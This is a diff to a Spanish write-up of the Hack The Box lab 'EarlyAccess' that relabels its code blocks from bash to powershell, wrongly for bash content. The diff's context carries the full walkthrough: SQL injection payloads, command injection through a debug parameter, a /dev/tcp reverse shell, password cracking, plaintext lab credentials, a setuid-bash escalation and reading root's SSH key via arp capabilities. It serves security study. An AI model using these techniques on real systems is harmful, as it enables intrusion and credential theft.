@@ -17,7 +17,7 @@ Por último abusaremos capacidades en <i> /usr/sbin/arp </i> para leer a través
 
 Encontramos 3 puertos abiertos el 22, 80 y el 443
 
-```bash
+```powershell
 
 leo@nardo$ nmap -p- --open --min-rate 5000 -Pn 10.10.11.110 -oG puertosAbiertos
 
@@ -87,7 +87,7 @@ width={828}
 height={113}
 />
 
-```bash
+```powershell
 leo@nardo$ python3 -m http.server 80
 
 'serving HTTP on 0.0.0.0 port 80 (https://0.0.0.0:80) ...',
@@ -239,7 +239,7 @@ Coge los primeros 3 caracteres y hace un Bitwise Left Shift operator por cada ca
 
 Intuimos que concatenando números y todas las letras del alfabeto y aplicando la lógica de la función y pasándole la posición 0, 1 y 2 obtendremos nuestro <i>g1</i> como en el siguiente script y lo podemos filtrar por 221 luego por 81 y 145.
 
-```bash
+```powershell
 #!/usr/bin/python3
 import sys, string
 
@@ -258,7 +258,7 @@ leo@nardo$ python3 script.py 0 | grep 221
 
 Obtenemos nuestra cadena mágica para la función g1 <i>KEY25</i>, los últimos dos caracteres son números arbitrarios pero no únicos.
 
-```bash
+```powershell
 return len(set(g1)) == len(g1)
 `.trim()
 ```
@@ -310,7 +310,7 @@ Notemos que la mayor suma posible es <i>sum(bytearray("XPZZ9".encode()))</i>
 y nos da <i>405</i> y la menor suma posible será <i>sum(bytearray("XPAA0".encode()))</i>
 que da <i>346</i> y restando nos da <i>60</i> añadiendo el cero.
 
-```bash
+```powershell
 #!/usr/bin/python3
 >> 405 - 346
 >> 59
@@ -322,7 +322,7 @@ puesto que <i>"AA0XP"</i> o <i>"AAXP0"</i> es 346, debemos tener en cuenta que l
 caracteres deben ser <i>XP</i> y el último carácter un número es por eso que estamos buscando cadenas
 Únicas que den una única suma del <i>346</i> al <i>405</i>.
 
-```bash
+```powershell
 #!/usr/bin/python3
 >> 405 - 346
 >> 59
@@ -507,7 +507,7 @@ es una buena señal porque ahora podremos leer la DB.
 Hay muchas formas de tener acceso basado en <i>SQL</i> nosotros usaremos la siguiente
 lógica.
 
-```bash
+```powershell
 leonardo') order by 3-- -
 
 leonardo') union select 1, 2, database()-- -
@@ -529,7 +529,7 @@ height={357}
 
 Guardamos el texto en un archivo <i>hash.txt</i> para luego intentar romperlo con <a src='https://github.com/openwall/john' target='_blank'>jhon</a>.
 
-```bash
+```powershell
 jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
@@ -553,7 +553,7 @@ height={307}
 
 al ver con más cuidado y utilizando <i>Burpsuite</i> hace una petición a <i>/actions/hash.php</i>.
 
-```bash
+```powershell
 action=hash&redirect=true&password=leonardo1234&hash_function=md5
 ```
 
@@ -562,7 +562,7 @@ La respuesta es una redirección 302 a <i>/home.php?tool=hashing</i> y nos retor
 A este punto pensamos que existen más archivos <i>.php</i> en el directorio <i>/actions</i> así que vamos
 a aplicar un <i>fuzzing</i> a esta ruta.
 
-```bash
+```powershell
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID-54n248979024dq084fckdn90" "http://dev.earlyaccess.htb/actions/FUZZ.php"
 
 ********************************************************
@@ -602,7 +602,7 @@ width={902}
 height={47}
 />
 
-```bash
+```powershell
 
 echo base64.txt | base64 -d > hash.php
 
@@ -629,7 +629,7 @@ return $hash;
 Notamos que hay una variable llamada debug, y dice que permite hashes personalizados,
 el desarrollador debió dejar esto a propósito para temas de debug...
 
-```bash
+```powershell
 if(isset($_REQUEST['action']))
 {
 if($_REQUEST['action'] === "verify")
@@ -654,7 +654,7 @@ return;
 Tal vez si encontramos una forma de manipular esta data con <i>Burpsuite</i> podremos ganar
 acceso al sistema.
 
-```bash
+```powershell
 action=hash&redirect=true&password=id&hash_function=system&debug=asd
 ```
 
@@ -666,13 +666,13 @@ height={93}
 
 Queda darnos una reverse shell.
 
-```bash
+```powershell
 action=hash&password=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&hash_function=system&debug=1
 ```
 
 ponemos en <i>url encode</i> para evitarnos errores y escuchamos en nuestro local con netcat.
 
-```bash
+```powershell
 leo@nardo$ nc -lnvp 443
 listening on [any] 443 ...
 connect to [10.10.14.6] from (UNKNOWN) [10.10.11.110] 49100
@@ -688,7 +688,7 @@ hostname -I
 Vemos que estamos en un contenedor, ya que nuestro target es <i>10.10.11.110</i>,
 ahora tenemos acceso al sistema antes de continuar hacemos un tratamiento de la consola con <i>script</i>.
 
-```bash
+```powershell
 www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ script /dev/null -c bash
 <rlyaccess.htb/dev/actions$ script /dev/null -c bash
 Script started, file is /dev/null
@@ -705,7 +705,7 @@ www-data@webserver:/var/www/earlyaccess.htb/dev/actions$
 Nos dirigimos a <i>/home</i>, visualizamos un usuario <i>www-adm</i> y un archivo <i>.wgetrc</i>
 que puede ser interesante.
 
-```bash
+```powershell
 www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cd /home
 www-data@webserver:/home$ ls
 www-adm
@@ -724,7 +724,7 @@ cat: .wgetrc: Permission denied
 
 Vemos si las credenciales anteriores en <i>https://dev.earlyaccess.htb</i> son reutilizables.
 
-```bash
+```powershell
 www-data@webserver:/home/www-adm$ su www-adm
 Password:
 www-adm@webserver:~$
@@ -732,7 +732,7 @@ www-adm@webserver:~$
 
 Estando como el usuario <i>www-adm</i> vemos si podemos ver <i>cat ~/.wgetrc</i>
 
-```bash
+```powershell
 www-adm@webserver:$ cat ~/.wgetrc
 user=api
 password=s3Cur3_API_PW!
@@ -741,7 +741,7 @@ www-adm@webserver:$
 
 Ahora, utilizando nc, verificaremos si existe alguna máquina con el nombre <i>API</i>
 
-```bash
+```powershell
 www-adm@webserver:$ nc API 80
 API [172.18.0.101] 80 (http) : Connection refused
 ```
@@ -749,7 +749,7 @@ API [172.18.0.101] 80 (http) : Connection refused
 y si existe tal máquina lo que no sabemos es que puertos tiene abiertos para
 ello crearemos un escáner en <i>/tmp</i>
 
-```bash
+```powershell
 for port in $(seq 1 65535); do
 timeout 1 bash -c "echo '' > /dev/tcp/172.18.0.101/$port" 2>/dev/null && echo "[+] $port - Open" &
 done; wait
@@ -757,21 +757,21 @@ done; wait
 
 Ejecutamos nuestro script...
 
-```bash
+```powershell
 www-adm@webserver:/tmp$ ./scan.sh
 [+] 5000 - Open
 ```
 
 Observamos el puerto 5000 abierto, intentaremos descargarlo...
 
-```bash
+```powershell
 www-adm@webserver:/tmp$ wget http://172.18.0.101:5000
 ```
 
 vemos un archivo <i>index.html</i> que dice: <i>Welcome to the game-key verification API! You can verify your keys via: /verify/game-key. If you are using manual ... te database using /check_db</i>
 vemos un archivo <i>check_db</i>, lo descargamos...
 
-```bash
+```powershell
 www-adm@webserver:/tmp$ wget http://172.18.0.101:5000/check_db
 ```
 
@@ -783,7 +783,7 @@ height={795}
 
 ingresamos por ssh a la <i>10.10.11.110</i> con las credenciales <i>drew</i>.
 
-```bash
+```powershell
 sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110
 drew@earlyacccess:~$ ls
 user.txt
@@ -796,7 +796,7 @@ el cual dice que si el juego se rompe automáticamente estará online en 1m apro
 
 También vemos que ...
 
-```bash
+```powershell
 game-adm@earlyaccess:/$ getcap -r / 2>/dev/null
 /usr/sbin/arp =ep
 /usr/bin/ping = cap_net_raw+ep
@@ -805,7 +805,7 @@ game-adm@earlyaccess:/$ getcap -r / 2>/dev/null
 teniendo arp que vale <i>=ep</i> podemos leer archivos root, pero arp solo pueden ejecutarlo los del grupo adm,
 entonces si nos convertimos en <i>game-adm</i> podremos escalar privilegios.
 
-```bash
+```powershell
 game-adm@earlyaccess:/$ ls -l /usr/sbin/arp
 -rwxr-x--- 1 root  adm 67512 Sep 24 2018 /usr/sbin/arp
 ```
@@ -819,7 +819,7 @@ que no nos resuelve por ejemplo <i>ping -c 1 game-server</i>.
 Toca hacer un descubrimiento de puertos en <i>hostname -I</i> y verificar cuál es el que tiene el puerto 22 abierto así ingresaremos con la rsa pública, para
 ello montaremos un script.
 
-```bash
+```powershell
 #!/bin/bash
 networks=$(hostname -I)
 
@@ -833,7 +833,7 @@ done
 
 Ahora teniendo los hostname terminando en <i>.0</i> crearemos otro script para ver en cuál de ellos está el puerto 22 abierto.
 
-```bash
+```powershell
 #!/bin/bash
 hostnames=(172.18.0.100 172.18.0.101 172.18.0.102 172.18.0.2 172.19.0.2 172.19.0.3)
 
@@ -847,14 +847,14 @@ drew@earlyacccess:/tmp$ ./port22Open.sh
 
 Ahora nos conectamos por <i>ssh</i> a la <i>172.19.0.3</i>
 
-```bash
+```powershell
 drew@earlyacccess:~/.ssh$ ssh game-tester@172.19.0.3
 ```
 
 Ahora estamos como <i>game-tester</i> con el host <i>game-server</i> tal vez en algún puerto de este
 host está corriendo el servidor web para ello vemos...
 
-```bash
+```powershell
 game-tester@game-server:/$ ss -nltp
 ...
 LISTEN  0   128   *:9999  *:*
@@ -864,7 +864,7 @@ LISTEN  0   128   *:9999  *:*
 de primeras no tenemos resolución a esa ruta que está en un contenedor pero podríamos ingresar
 con ssh y el parámetro -D
 
-```bash
+```powershell
 sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110 -D 1080
 ```
 
@@ -880,7 +880,7 @@ src='https://res.cloudinary.com/djc1umong/image/upload/v1686606113/early_game_99
 
 Ahora en <i>/</i> tenemos un archivo llamado <i>entrypoint.sh</i>
 
-```bash
+```powershell
 game-tester@game-server:/$ cat entrypoint.sh
 #!/bin/bash
 for ep in /docker-entrypoint.d/*; do
@@ -894,7 +894,7 @@ tail -f /dev/null
 
 vemos que en <i>/docker-entrypoint.d</i> tenemos un archivo <i>node-server.sh</i>...
 
-```bash
+```powershell
 game-tester@game-server:/$ cat node-server.sh
 service ssh start
 
@@ -908,7 +908,7 @@ sudo -u node node server.js
 coger cada archivo dentro de <i>/docker-entrypoint.d</i> y lo ejecuta, pero el <i>node-server.sh</i> lo tendrá que traerlo de alguna ruta para ello
 ejecutamos...
 
-```bash
+```powershell
 find \\-name node-server.sh 2>/dev/null
 ./opt/docker-entrypoint.d/node-server.sh
 ```
@@ -916,13 +916,13 @@ find \\-name node-server.sh 2>/dev/null
 es esta la ruta donde tendremos que crear nuestro script para ganar acceso y
 tratar de petar el juego como por ejemplo <i>curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'</i>
 
-```bash
+```powershell
 drew@earlyaccess:/$ while true; do echo "chmod u+s /bin/bash" > /opt/docker-entrypoint/miscript.sh; chmod +x /opt/docker-entrypoint/miscript.sh;sleep 1; done
 ```
 
 y del otro lado... y esperamos ....
 
-```bash
+```powershell
 game-tester@game-server:/$ curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'
 Connection to 172.19.0.3 closed by remote host.
 Connection to 172.19.0.3 closed.
@@ -931,7 +931,7 @@ drew@earlyaccess:~/.shh
 
 una vez que nos bota el host nos conectamos de nuevo <i>ssh game-tester@172.19.0.3</i> y listooo...
 
-```bash
+```powershell
 -bash-4.4$ cd /docker-entrypoint.d/
 -bash-4.4$ ls
 miscript.sh node-server.sh
@@ -944,7 +944,7 @@ bash-4.4#
 no vemos ninguna flag en la raiz pero podemos ver el <i>/etc/shadow</i> y existe un mismo usuario <i>game-adm</i>
 la trataremos de romper con nuestro querido <i>jhon</i>.
 
-```bash
+```powershell
 jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
 ...
 gamemaster (game-adm)
@@ -956,7 +956,7 @@ este usuario pertenece al grupo <i>4(adm)</i> recordemos que teníamos <i>arp</i
 capacidades de <i>=ep</i> la cual nos permite leer archivos como indica <a href='https://gtfobins.github.io/gtfobins/arp/#file-read' target='_blank'>gtfobins</a>,
 entonces procedemos de la siguiente manera...
 
-```bash
+```powershell
 game-adm@earlyaccess:/home$ LFILE=/root/.ssh/id_rsa
 game-adm@earlyaccess:/home$ /usr/sbin/arp -v -f $LFILE 2>&1 | grep -Ev "format|cannot|Unknown host" | sed 's/>> //' >/tmp/id_rsa
 game-adm@earlyaccess:/home$ chmod 600 /tmp/id_rsa
